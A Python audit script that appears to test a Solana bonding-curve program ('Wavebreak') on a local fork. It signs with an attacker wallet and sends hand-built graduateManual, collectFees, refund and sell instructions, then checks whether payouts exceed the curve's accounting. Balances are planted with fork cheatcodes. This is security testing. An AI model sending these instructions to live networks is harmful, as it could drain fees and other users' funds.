"""Wavebreak: graduation/reward/refund ordering + fee-custody claim, with *correct* accounts.

WB-G05 in the previous run failed on an account-seeding artifact (wrong fee-authority ATA), and
WB-G01 failed on `destination` binding. Here both are rebuilt from live state so the guard that
actually fires is the security guard, per rule 10.  Also measures, on the 7 curves whose
graduation window has passed, whether TokenRefund pays out more than the curve's internal
accounting releases (fee/other-user custody drain).
"""
import sys, json, struct, base64, time
sys.path.insert(0, "/home/user/orca-audit/tools")
import forknet as F
from solders.instruction import Instruction
from solders.pubkey import Pubkey

WB = "waveQX2yP3H1pVU8djGvEHmYg8uamQ84AuyGtpsrXTF"
WSOL = F.WSOL
USDC = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"
FEE_AUTH = "8AbiHetkXXjkbUJe9XBLEaaGWvkJQbakJ746WQbi6Qor"
ACFG = "5yXDawwQ5s3hZXMJjLWryvDWsNKHYKqp6vkdSfgsaee4"
actor = F.load_actor(); A = str(actor.pubkey())
ATA_WSOL = "HMRvmgya8xKgDsbZfLGrYEjGNeFrJSe27JBhsAE2P7jh"
CURVES = {c["address"]: c for c in json.load(open("/home/user/orca-audit/recon/wb_curves.json"))}
LBL = {0: "None", 1: "Whirlpool", 2: "Manual"}


def ata_of(owner, mint, prog=F.TOKEN):
    return str(Pubkey.find_program_address([bytes(F.pk(owner)), bytes(F.pk(prog)), bytes(F.pk(mint))],
                                           F.pk(F.ATA))[0])


def prog_of_mint(mint):
    v = F.get_account(mint)
    return (v or {}).get("owner")


def snap(a):
    v = F.get_account(a)
    if not v:
        return None
    raw = base64.b64decode(v["data"][0])
    out = {"lamports": v["lamports"], "space": v["space"], "owner": v["owner"],
           "hash": F.hashlib.sha256(raw).hexdigest()}
    if v["space"] == 165 and len(raw) >= 72:
        out["amount"] = struct.unpack_from("<Q", raw, 64)[0]
    if v["space"] == 2048 and len(raw) >= 224:
        out["quote_amount"] = struct.unpack_from("<Q", raw, 208)[0]
        out["base_amount"] = struct.unpack_from("<Q", raw, 216)[0]
    return out


def M(k, w=False, s=False):
    return F.AM(k, writable=w, signer=s)


RESULTS = []


def run(name, ixs, watch, note=""):
    before = {a: snap(a) for a in watch}
    sb = F.get_slot()
    r = F.send(ixs, actor)
    after = {a: snap(a) for a in watch}
    det = r.get("detail", {})
    logs = [l.strip() for l in det.get("logs", [])]
    tok = {a: (after.get(a) or {}).get("amount", 0) - (before.get(a) or {}).get("amount", 0)
           for a in watch if (after.get(a) or {}).get("space") == 165}
    acct = {a: (after.get(a) or {}).get("quote_amount", 0) - (before.get(a) or {}).get("quote_amount", 0)
            for a in watch if (after.get(a) or {}).get("space") == 2048}
    rec = {"case": name, "note": note, "forkSlotBefore": sb, "forkSlotAfter": F.get_slot(),
           "sig": r.get("result"), "err": det.get("err") or r.get("error"), "logs": logs,
           "before": before, "after": after,
           "tokenDeltas": {k: v for k, v in tok.items() if v},
           "accountingDeltas": {k: v for k, v in acct.items() if v}}
    RESULTS.append(rec)
    print(f"\n### {name}   [{note}]")
    print("   err:", json.dumps(rec["err"])[:150])
    print("   logs:", " | ".join(l.split('log:')[-1].strip() for l in logs if 'log:' in l or 'failed' in l)[:290])
    print("   token deltas:", json.dumps(rec["tokenDeltas"]))
    print("   curve accounting delta:", json.dumps(rec["accountingDeltas"]))
    return rec


def main():
    # 7 curves with a Manual method and graduation_time in the past (window closed)
    now = int(time.time())
    manual = [c for c in CURVES.values()
              if any(m["label"] == 2 and not m["graduated"] for m in c["graduation_methods"])]
    print("manual-method curves:", len(manual))
    for c in sorted(manual, key=lambda x: -x["quote_amount"])[:3]:
        T = c["address"]; BASE = c["base_mint"]; QM = c["quote_mint"]
        qp = prog_of_mint(QM) or F.TOKEN
        bp = prog_of_mint(BASE) or F.TOKEN
        VAULT = ata_of(T, QM, qp)
        attacker_q = ata_of(A, QM, qp)
        attacker_b = ata_of(A, BASE, bp)
        dest = [m["destination"] for m in c["graduation_methods"] if m["label"] == 2][0]
        dest_q = ata_of(dest, QM, qp)
        dest_b = ata_of(dest, BASE, bp)
        print(f"\n--- curve {T} quoteMint={QM[:12]}({qp[:8]}) baseMint={BASE[:14]}({bp[:8]})")
        print(f"    vault={VAULT} {snap(VAULT)}")
        print(f"    configured destination={dest}  destQuoteAta={dest_q}")
        # create the attacker's own ATAs (legitimate account creation by the attacker)
        i1, x1 = F.create_ata(A, QM, qp, A)
        i2, x2 = F.create_ata(A, BASE, bp, A)
        rr = F.send([x1, x2], actor)
        print("    attacker ATAs:", i1, i2, "err", json.dumps((rr.get('detail') or {}).get('err')))
        watch = [A, attacker_q, attacker_b, T, VAULT, dest_q, dest_b]
        # graduateManual with the CORRECT configured destination (account list from the client codegen)
        gm = Instruction(F.pk(WB), bytes([33]), [
            M(A, w=True, s=True), M(dest), M(T, w=True), M(QM), M(VAULT, w=True),
            M(attacker_q, w=True), M(dest_q, w=True), M(BASE, w=True), M(dest_b, w=True),
            M(F.SYSTEM), M(F.ATA), M(qp), M(bp)])
        run(f"WB-G10 graduateManual: attacker signer + CORRECT destination", [gm], watch,
            "is any signer allowed to trigger the payout?")
        # collectFees with the real fee-authority ATA (so the privilege guard is what fires)
        fee_q = ata_of(FEE_AUTH, QM, qp)
        F.send([F.create_ata(FEE_AUTH, QM, qp, A)[1]], actor)   # attacker pays rent for the fee ATA if absent
        cf = Instruction(F.pk(WB), bytes([49]), [
            M(A, w=True, s=True), M(FEE_AUTH), M(fee_q, w=True), M(T, w=True), M(BASE, w=True),
            M(QM), M(VAULT, w=True), M(ACFG), M(F.SYSTEM), M(F.ATA), M(qp)])
        run(f"WB-G11 collectFees: attacker signer, real fee-authority ATA", [cf], watch + [fee_q],
            "fee custody claim gate (attacker receives nothing if gated)")
        # tokenRefund on this expired-window curve, with fork-funded base balance
        fund = 0
        mv = F.get_account(BASE)
        if mv:
            mraw = bytearray(base64.b64decode(mv["data"][0]))
            supply0 = struct.unpack_from("<Q", mraw, 36)[0]
            dec = mraw[44]
            fund = 10 ** (dec + 3)
            ab = F.get_account(attacker_b)
            if ab:
                v2 = bytearray(base64.b64decode(ab["data"][0]))
                struct.pack_into("<Q", v2, 64, fund)
                F.rpc.rpc("surfnet_setAccount", [attacker_b, {"lamports": ab["lamports"], "data": bytes(v2).hex(),
                                                                "owner": qp, "executable": False}], url=F.FORK)
                F.rpc.rpc("surfnet_setSupply", [BASE, {"total": str(supply0 + fund)}], url=F.FORK)
        rf = Instruction(F.pk(WB), bytes([12]), [
            M(A, w=True, s=True), M(T, w=True), M(QM), M(VAULT, w=True), M(attacker_q, w=True),
            M(BASE, w=True), M(attacker_b, w=True), M(F.SYSTEM), M(bp), M(qp), M(F.ATA)])
        rec = run(f"WB-G12 tokenRefund (expired window curve, funded attacker)", [rf], watch,
                  "refund payout vs accounting")
        # retry with the curve whose launch window is closed by time (graduation_time>0 & past)
        sell = Instruction(F.pk(WB), bytes([10]) + struct.pack("<QB", fund // 10, 0) + b"\x00", [
            M(A, w=True, s=True), M(T, w=True), M(BASE, w=True), M(attacker_b, w=True), M(QM),
            M(VAULT, w=True), M(attacker_q, w=True), M(F.SYSTEM), M(F.ATA), M(bp), M(qp)])
        rec2 = run(f"WB-G13 sell on this curve (payout vs accounting)", [sell], watch,
                   "does a sell pay more than accounting releases?")
        if rec2["tokenDeltas"].get(attacker_q, 0) > 0 and rec2["accountingDeltas"].get(T, 0) < 0:
            paid = rec2["tokenDeltas"][attacker_q]
            rel = -rec2["accountingDeltas"][T]
            print(f"   >>> payout={paid:,} vs accounting released={rel:,}  excess={paid-rel:+,}")
            RESULTS[-1]["payoutVsAccounting"] = {"payout": paid, "accountingReleased": rel, "excess": paid - rel}
        if len(manual) > 3:
            break
    json.dump({"results": RESULTS,
               "fundingNote": "attacker base ATA + mint supply set via Surfpool fork cheatcodes "
                              "(fixture funding only; not exploit evidence)"},
              open("/home/user/orca-audit/evidence/WBG2_grad_refund.json", "w"), indent=1)
    print("\nsaved evidence/WBG2_grad_refund.json")


if __name__ == "__main__":
    main()
